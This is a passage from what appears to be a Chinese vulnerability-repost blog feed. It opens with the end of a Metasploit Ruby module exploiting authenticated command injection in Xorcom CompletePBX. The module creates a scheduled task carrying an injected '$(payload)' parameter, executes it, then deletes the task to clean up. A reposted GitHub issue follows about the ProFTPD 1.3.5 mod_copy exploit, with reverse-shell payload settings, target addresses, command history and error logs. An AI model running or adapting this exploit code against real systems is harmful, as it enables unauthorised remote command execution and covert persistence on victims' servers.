received&#x27;</span>)<br>    end<br><br>    print_good(<span class="hljs-string">&quot;Authentication successful! Session ID: <span class="hljs-subst">#&#123;sid_cookie&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> sid_cookie<br>  end<br><br>  def get_latest_task_id(sid_cookie, task_desc)<br>    print_status(<span class="hljs-string">&quot;Retrieving latest task ID for description: <span class="hljs-subst">#&#123;task_desc&#125;</span>...&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;GET&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_get&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;tasks&#x27;</span>,<br>        <span class="hljs-string">&#x27;offset&#x27;</span> =&gt; <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&#x27;max&#x27;</span> =&gt; <span class="hljs-string">&#x27;20&#x27;</span>,<br>        <span class="hljs-string">&#x27;search&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span><br>      &#125;,<br>      <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target while fetching tasks&#x27;</span>)<br>    end<br><br>    json_res = res.get_json_document<br>    tasks = json_res[<span class="hljs-string">&#x27;rows&#x27;</span>]<br><br>    <span class="hljs-keyword">unless</span> tasks<br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Failed to retrieve task list&#x27;</span>)<br>    end<br><br>    tasks.each <span class="hljs-keyword">do</span> |task|<br>      <span class="hljs-keyword">if</span> task[<span class="hljs-number">2</span>] == task_desc<br>        print_good(<span class="hljs-string">&quot;Found task with ID: <span class="hljs-subst">#&#123;task[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> task[<span class="hljs-number">0</span>]<br>      end<br>    end<br><br>    fail_with(Failure::NotFound, <span class="hljs-string">&quot;Could not find the task with description: <span class="hljs-subst">#&#123;task_desc&#125;</span>&quot;</span>)<br>  end<br><br>  def create_task(sid_cookie)<br>    task_desc = Faker::Lorem.sentence(word_count: <span class="hljs-number">4</span>)<br>    notes = Faker::Lorem.paragraph(sentence_count: <span class="hljs-number">3</span>)<br>    print_status(<span class="hljs-string">&quot;Creating malicious scheduled task with description: <span class="hljs-subst">#&#123;task_desc&#125;</span>&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;script&#x27;</span> =&gt; <span class="hljs-string">&#x27;backup&#x27;</span>,<br>        <span class="hljs-string">&#x27;description&#x27;</span> =&gt; task_desc,<br>        <span class="hljs-string">&#x27;starting&#x27;</span> =&gt; Time.now.strftime(<span class="hljs-string">&#x27;%Y-%m-%d %H:%M&#x27;</span>),<br>        <span class="hljs-string">&#x27;interval&#x27;</span> =&gt; <span class="hljs-string">&#x27;1&#x27;</span>,<br>        <span class="hljs-string">&#x27;interval_unit&#x27;</span> =&gt; <span class="hljs-string">&#x27;month&#x27;</span>,<br>        <span class="hljs-string">&#x27;parameters&#x27;</span> =&gt; <span class="hljs-string">&quot;$(<span class="hljs-subst">#&#123;payload.encoded&#125;</span>)&quot;</span>,<br>        <span class="hljs-string">&#x27;notes&#x27;</span> =&gt; notes,<br>        <span class="hljs-string">&#x27;data&#x27;</span> =&gt; <span class="hljs-string">&#x27;0&#x27;</span>,<br>        <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;save_task&#x27;</span>,<br>        <span class="hljs-string">&#x27;mode&#x27;</span> =&gt; <span class="hljs-string">&#x27;create&#x27;</span><br>      &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target while creating task&#x27;</span>)<br>    end<br><br>    json_res = res.get_json_document<br>    state = json_res[<span class="hljs-string">&#x27;state&#x27;</span>]<br><br>    <span class="hljs-keyword">if</span> state == <span class="hljs-string">&#x27;success&#x27;</span><br>      print_good(<span class="hljs-string">&#x27;Malicious task successfully created.&#x27;</span>)<br>      <span class="hljs-keyword">return</span> task_desc<br>    <span class="hljs-keyword">else</span><br>      fail_with(Failure::UnexpectedReply, <span class="hljs-string">&#x27;Failed to create the malicious task&#x27;</span>)<br>    end<br>  end<br><br>  def run_task(sid_cookie, task_id)<br>    print_status(<span class="hljs-string">&quot;Executing malicious task ID <span class="hljs-subst">#&#123;task_id&#125;</span>...&quot;</span>)<br><br>    res = send_request_cgi(&#123;<br>      <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>      <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>      <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie,<br>      <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>      <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>        <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;run_task&#x27;</span>,<br>        <span class="hljs-string">&#x27;mode&#x27;</span> =&gt; <span class="hljs-string">&#x27;run&#x27;</span>,<br>        <span class="hljs-string">&#x27;data&#x27;</span> =&gt; task_id.to_s<br>      &#125;<br>    &#125;)<br><br>    <span class="hljs-keyword">unless</span> res<br>      fail_with(Failure::Unreachable, <span class="hljs-string">&#x27;No response from target while executing task&#x27;</span>)<br>    end<br><br>    print_good(<span class="hljs-string">&#x27;Task executed successfully!&#x27;</span>)<br>  end<br><br>  def delete_task(sid_cookie, task_id)<br>    %w[<span class="hljs-keyword">delete</span> deleteConfirmed].each <span class="hljs-keyword">do</span> |mode|<br>      print_status(<span class="hljs-string">&quot;Sending delete request (mode=<span class="hljs-subst">#&#123;mode&#125;</span>) for task ID <span class="hljs-subst">#&#123;task_id&#125;</span>...&quot;</span>)<br><br>      send_request_cgi(&#123;<br>        <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;cookie&#x27;</span> =&gt; sid_cookie,<br>        <span class="hljs-string">&#x27;ctype&#x27;</span> =&gt; <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        <span class="hljs-string">&#x27;vars_post&#x27;</span> =&gt; &#123;<br>          <span class="hljs-string">&#x27;class&#x27;</span> =&gt; <span class="hljs-string">&#x27;scheduler&#x27;</span>,<br>          <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;delete_task&#x27;</span>,<br>          <span class="hljs-string">&#x27;mode&#x27;</span> =&gt; mode,<br>          <span class="hljs-string">&#x27;data&#x27;</span> =&gt; task_id.to_s<br>        &#125;<br>      &#125;)<br>    end<br><br>    print_good(<span class="hljs-string">&quot;Task <span class="hljs-subst">#&#123;task_id&#125;</span> deleted successfully!&quot;</span>)<br>  end<br><br>  def exploit<br>    sid_cookie = login<br>    task_desc = create_task(sid_cookie)<br>    task_id = get_latest_task_id(sid_cookie, task_desc)<br>    run_task(sid_cookie, task_id)<br>    delete_task(sid_cookie, task_id)<br>  end<br>end<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Xorcom CompletePBX Authenticated Comman</summary>
      
    
    
    
    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
    
    
    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
    
  </entry>
  
  <entry>
    <title>ProFTPD 135 mod_copy模块命令执行漏洞</title>
    <link href="http://example.com/2025/06/30/github_2006755968/"/>
    <id>http://example.com/2025/06/30/github_2006755968/</id>
    <published>2025-06-30T15:45:33.330Z</published>
    <updated>2025-06-30T15:45:33.325Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> ProFTPD 1.3.5 mod_copy模块命令执行漏洞</p><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> ProFTPD 1.3.5版本中的mod_copy模块存在命令执行漏洞，攻击者可以利用此漏洞在目标系统上执行任意命令。</p><p><strong>产品厂商：</strong> ProFTPD</p><p><strong>产品名称：</strong> ProFTPD</p><p><strong>影响版本：</strong> 1.3.5</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20274">https://github.com/rapid7/metasploit-framework/issues/20274</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="Steps-to-reproduce"><a href="#Steps-to-reproduce" class="headerlink" title="Steps to reproduce"></a>Steps to reproduce</h3><p>How’d you do it?</p><ol><li>get virtualbox ubuntu 24.04</li><li>get meterpreter (i installed as shown on site via shell)</li><li>run unix&#x2F;ftp&#x2F;proftpd_modcopy_exec on appropriate target</li></ol><p>target has Linux, ProFTPD 1.3.5 on port 21, OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) on port 22, Linux telnetd on port 23, Apache httpd 2.4.29 on port 80</p><h3 id="Were-you-following-a-specific-guide-tutorial-or-reading-documentation"><a href="#Were-you-following-a-specific-guide-tutorial-or-reading-documentation" class="headerlink" title="Were you following a specific guide&#x2F;tutorial or reading documentation?"></a>Were you following a specific guide&#x2F;tutorial or reading documentation?</h3><p>documentation based experience</p><h3 id="Expected-behavior"><a href="#Expected-behavior" class="headerlink" title="Expected behavior"></a>Expected behavior</h3><p>upon successful execution, attack should open meterpreter “window” (i’d call it session but it clearly does open session, just doesn’t allow me to type anything in)</p><h3 id="Current-behavior"><a href="#Current-behavior" class="headerlink" title="Current behavior"></a>Current behavior</h3><p>payload successfully executes, i get “meterpreter session opened” and no actual option to use meterpreter</p><p><img src="https://github.com/user-attachments/assets/13ff0f25-7a4f-436f-bbb9-6f3dce6b4b63" alt="Image"></p><p><img src="https://github.com/user-attachments/assets/1aebb4d8-918c-48b2-a251-7970f09b1f36" alt="Image"></p><h4 id="Metasploit-version"><a href="#Metasploit-version" class="headerlink" title="Metasploit version"></a>Metasploit version</h4><p>6.4.55~20250326102656~1rapid7-1</p><h3 id="Module-Datastore"><a href="#Module-Datastore" class="headerlink" title="Module&#x2F;Datastore"></a>Module&#x2F;Datastore</h3><p>The following global&#x2F;module datastore, and database setup was configured before the issue occurred:</p><details><summary>Collapse</summary><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[framework/ui/console]<br><span class="hljs-attribute">ActiveModule</span>=exploit/unix/ftp/proftpd_modcopy_exec<br><br>[unix/ftp/proftpd_modcopy_exec]<br><span class="hljs-attribute">payload</span>=cmd/unix/reverse_perl<br><span class="hljs-attribute">SITEPATH</span>=/var/www/html<br><span class="hljs-attribute">LHOST</span>=10.13.13.13<br><span class="hljs-attribute">LPORT</span>=4445<br><span class="hljs-attribute">RHOSTS</span>=10.13.13.4<br><span class="hljs-attribute">loglevel</span>=3<br>WORKSPACE=<br><span class="hljs-attribute">VERBOSE</span>=<span class="hljs-literal">false</span><br><span class="hljs-attribute">WfsDelay</span>=2<br><span class="hljs-attribute">EnableContextEncoding</span>=<span class="hljs-literal">false</span><br>ContextInformationFile=<br><span class="hljs-attribute">DisablePayloadHandler</span>=<span class="hljs-literal">false</span><br><span class="hljs-attribute">RPORT</span>=80<br><span class="hljs-attribute">SSL</span>=<span class="hljs-literal">false</span><br>SSLServerNameIndication=<br><span class="hljs-attribute">SSLVersion</span>=Auto<br><span class="hljs-attribute">SSLVerifyMode</span>=PEER<br>SSLCipher=<br>Proxies=<br>CPORT=<br>CHOST=<br><span class="hljs-attribute">ConnectTimeout</span>=10<br>TCP::<span class="hljs-attribute">max_send_size</span>=0<br>TCP::<span class="hljs-attribute">send_delay</span>=0<br>VHOST=<br><span class="hljs-attribute">UserAgent</span>=Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0<br>HttpUsername=<br>HttpPassword=<br>HttpRawHeaders=<br><span class="hljs-attribute">DigestAuthIIS</span>=<span class="hljs-literal">true</span><br><span class="hljs-attribute">FingerprintCheck</span>=<span class="hljs-literal">true</span><br><span class="hljs-attribute">DOMAIN</span>=WORKSTATION<br>HttpClientTimeout=<br><span class="hljs-attribute">HttpTrace</span>=<span class="hljs-literal">false</span><br><span class="hljs-attribute">HttpTraceHeadersOnly</span>=<span class="hljs-literal">false</span><br><span class="hljs-attribute">HttpTraceColors</span>=red/blu<br>HTTP::<span class="hljs-attribute">uri_encode_mode</span>=hex-normal<br>HTTP::<span class="hljs-attribute">uri_full_url</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">pad_method_uri_count</span>=1<br>HTTP::<span class="hljs-attribute">pad_uri_version_count</span>=1<br>HTTP::<span class="hljs-attribute">pad_method_uri_type</span>=space<br>HTTP::<span class="hljs-attribute">pad_uri_version_type</span>=space<br>HTTP::<span class="hljs-attribute">method_random_valid</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">method_random_invalid</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">method_random_case</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">version_random_valid</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">version_random_invalid</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">uri_dir_self_reference</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">uri_dir_fake_relative</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">uri_use_backslashes</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">pad_fake_headers</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">pad_fake_headers_count</span>=0<br>HTTP::<span class="hljs-attribute">pad_get_params</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">pad_get_params_count</span>=16<br>HTTP::<span class="hljs-attribute">pad_post_params</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">pad_post_params_count</span>=16<br>HTTP::<span class="hljs-attribute">shuffle_get_params</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">shuffle_post_params</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">uri_fake_end</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">uri_fake_params_start</span>=<span class="hljs-literal">false</span><br>HTTP::<span class="hljs-attribute">header_folding</span>=<span class="hljs-literal">false</span><br>FileDropperDelay=<br><span class="hljs-attribute">AllowNoCleanup</span>=<span class="hljs-literal">false</span><br><span class="hljs-attribute">RPORT_FTP</span>=21<br><span class="hljs-attribute">TARGETURI</span>=/<br><span class="hljs-attribute">TMPPATH</span>=/tmp<br>ReverseListenerBindPort=<br><span class="hljs-attribute">ReverseAllowProxy</span>=<span class="hljs-literal">false</span><br>ReverseListenerComm=<br>ReverseListenerBindAddress=<br><span class="hljs-attribute">ReverseListenerThreaded</span>=<span class="hljs-literal">false</span><br><span class="hljs-attribute">StagerRetryCount</span>=10<br><span class="hljs-attribute">StagerRetryWait</span>=5<br>InitialAutoRunScript=<br>AutoRunScript=<br>CommandShellCleanupCommand=<br><span class="hljs-attribute">AutoVerifySession</span>=<span class="hljs-literal">true</span><br><span class="hljs-attribute">PerlPath</span>=perl<br></code></pre></td></tr></table></figure></details><h3 id="Database-Configuration"><a href="#Database-Configuration" class="headerlink" title="Database Configuration"></a>Database Configuration</h3><p>The database contains the following information:</p><details><summary>Collapse</summary><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Session</span> <span class="hljs-keyword">Type</span>: Connected <span class="hljs-keyword">to</span> msf. <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">type</span>: postgresql.<br></code></pre></td></tr></table></figure><table><thead><tr><th align="right">ID</th><th align="right">Hosts</th><th align="right">Vulnerabilities</th><th align="right">Notes</th><th align="right">Services</th></tr></thead><tbody><tr><td align="right">1 <strong>(Current)</strong></td><td align="right">1</td><td align="right">1</td><td align="right">0</td><td align="right">0</td></tr><tr><td align="right"><strong>Total (1)</strong></td><td align="right"><strong>1</strong></td><td align="right"><strong>1</strong></td><td align="right"><strong>0</strong></td><td align="right"><strong>0</strong></td></tr></tbody></table></details><h3 id="Framework-Configuration"><a href="#Framework-Configuration" class="headerlink" title="Framework Configuration"></a>Framework Configuration</h3><p>The features are configured as follows:</p><details><summary>Collapse</summary><table><thead><tr><th align="right">name</th><th align="right">enabled</th></tr></thead><tbody><tr><td align="right">wrapped_tables</td><td align="right">true</td></tr><tr><td align="right">fully_interactive_shells</td><td align="right">false</td></tr><tr><td align="right">manager_commands</td><td align="right">false</td></tr><tr><td align="right">metasploit_payload_warnings</td><td align="right">true</td></tr><tr><td align="right">defer_module_loads</td><td align="right">false</td></tr><tr><td align="right">smb_session_type</td><td align="right">true</td></tr><tr><td align="right">postgresql_session_type</td><td align="right">true</td></tr><tr><td align="right">mysql_session_type</td><td align="right">true</td></tr><tr><td align="right">mssql_session_type</td><td align="right">true</td></tr><tr><td align="right">ldap_session_type</td><td align="right">true</td></tr><tr><td align="right">show_successful_logins</td><td align="right">false</td></tr><tr><td align="right">dns</td><td align="right">true</td></tr><tr><td align="right">hierarchical_search_table</td><td align="right">true</td></tr><tr><td align="right">display_module_action</td><td align="right">true</td></tr></tbody></table></details><h3 id="History"><a href="#History" class="headerlink" title="History"></a>History</h3><p>The following commands were ran during the session and before this issue occurred:</p><details><summary>Collapse</summary><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">23 </span>    search Pro FTPD<br><span class="hljs-symbol">24 </span>    search Pro FTPD <span class="hljs-number">1.3</span>.<span class="hljs-number">5</span><br><span class="hljs-symbol">25 </span>    use <span class="hljs-number">0</span><br><span class="hljs-symbol">26 </span>    show payloads<br><span class="hljs-symbol">27 </span>    use <span class="hljs-number">10</span><br><span class="hljs-symbol">28 </span>    set payload <span class="hljs-number">10</span><br><span class="hljs-symbol">29 </span>    show options<br><span class="hljs-symbol">30 </span>    set SITEPATH /var/www<br><span class="hljs-symbol">31 </span>    set SITEPATH /var/www/html<br><span class="hljs-symbol">32 </span>    set LHOST <span class="hljs-number">10.13</span>.<span class="hljs-number">13.13</span><br><span class="hljs-symbol">33 </span>    set LPORT <span class="hljs-number">4445</span><br><span class="hljs-symbol">34 </span>    <span class="hljs-keyword">run</span><br><span class="hljs-symbol">35 </span>    set RHOSTS <span class="hljs-number">10.13</span>.<span class="hljs-number">13.4</span><br><span class="hljs-symbol">36 </span>    <span class="hljs-keyword">run</span><br><span class="hljs-symbol">37 </span>    msfupdate<br><span class="hljs-symbol">38 </span>    show options<br><span class="hljs-symbol">39 </span>    set loglevel <span class="hljs-number">3</span><br><span class="hljs-symbol">40 </span>    <span class="hljs-keyword">run</span><br><span class="hljs-symbol">41 </span>    debug<br></code></pre></td></tr></table></figure></details><h3 id="Framework-Errors"><a href="#Framework-Errors" class="headerlink" title="Framework Errors"></a>Framework Errors</h3><p>The following framework errors occurred before the issue occurred:</p><details><summary>Collapse</summary><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nix">[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">10</span>:<span class="hljs-number">54</span>:<span class="hljs-number">29</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Dependency for windows<span class="hljs-symbol">/encrypted_reverse_tcp</span> is not supported<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">10</span>:<span class="hljs-number">55</span>:<span class="hljs-number">27</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> rhosts walker invalid <span class="hljs-operator">-</span> NoMethodError undefined method `scan&#x27; for nil:NilClass<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">10</span>:<span class="hljs-number">55</span>:<span class="hljs-number">44</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Exploit failed (unix<span class="hljs-operator">/</span>ftp<span class="hljs-operator">/</span>proftpd_modcopy_exec): Rex::BindFailed The address is already <span class="hljs-keyword">in</span> use <span class="hljs-keyword">or</span> <span class="hljs-params">unavailable:</span> (<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">4445</span>). <span class="hljs-operator">-</span> Rex::BindFailed The address is already <span class="hljs-keyword">in</span> use <span class="hljs-keyword">or</span> <span class="hljs-params">unavailable:</span> (<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">4445</span>).<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">06</span>:<span class="hljs-number">38</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Exploit failed (unix<span class="hljs-operator">/</span>ftp<span class="hljs-operator">/</span>proftpd_modcopy_exec): Rex::BindFailed The address is already <span class="hljs-keyword">in</span> use <span class="hljs-keyword">or</span> <span class="hljs-params">unavailable:</span> (<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">4445</span>). <span class="hljs-operator">-</span> Rex::BindFailed The address is already <span class="hljs-keyword">in</span> use <span class="hljs-keyword">or</span> <span class="hljs-params">unavailable:</span> (<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">4445</span>).<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">17</span>:<span class="hljs-number">56</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Dependency for windows<span class="hljs-symbol">/x64/encrypted_shell_reverse_tcp</span> is not supported<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">17</span>:<span class="hljs-number">57</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Dependency for windows<span class="hljs-symbol">/encrypted_shell_reverse_tcp</span> is not supported<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">18</span>:<span class="hljs-number">07</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Dependency for windows<span class="hljs-symbol">/x64/encrypted_reverse_tcp</span> is not supported<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">18</span>:<span class="hljs-number">09</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Dependency for windows<span class="hljs-symbol">/encrypted_reverse_tcp</span> is not supported<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">21</span>:<span class="hljs-number">52</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> rhosts walker invalid <span class="hljs-operator">-</span> NoMethodError undefined method `scan&#x27; for nil:NilClass<br>[<span class="hljs-number">05</span><span class="hljs-symbol">/31/2025</span> <span class="hljs-number">11</span>:<span class="hljs-number">42</span>:<span class="hljs-number">57</span>] [e(<span class="hljs-number">0</span>)] <span class="hljs-params">core:</span> Exploit failed (unix<span class="hljs-operator">/</span>ftp<span class="hljs-operator">/</span>proftpd_modcopy_exec): Rex::ConnectionTimeout The connection <span class="hljs-keyword">with</span> (<span class="hljs-number">10.13</span>.<span class="hljs-number">13.4</span>:<span class="hljs-number">21</span>) timed out. <span class="hljs-operator">-</span> Rex::ConnectionTimeout The connection <span class="hljs-keyword">with</span> (<span class="hljs-number">10.13</span>.<span class="hljs-number">13.4</span>:<span class="hljs-number">21</span>) timed out.<br></code></pre></td></tr></table></figure></details><h3 id="Web-Service-Errors"><a href="#Web-Service-Errors" class="headerlink" title="Web Service Errors"></a>Web Service Errors</h3><p>The following web service errors occurred before the issue occurred:</p><details><summary>Collapse</summary><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">msf-ws.<span class="hljs-built_in">log</span> <span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span> exist.<br></code></pre></td></tr></table></figure></details><h3 id="Framework-Logs"><a href="#Framework-Logs" class="headerlink" title="Framework Logs"></a>Framework Logs</h3><p>The following framework logs were recorded before the issue occurred:</p><details><summary>Collapse</summary><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 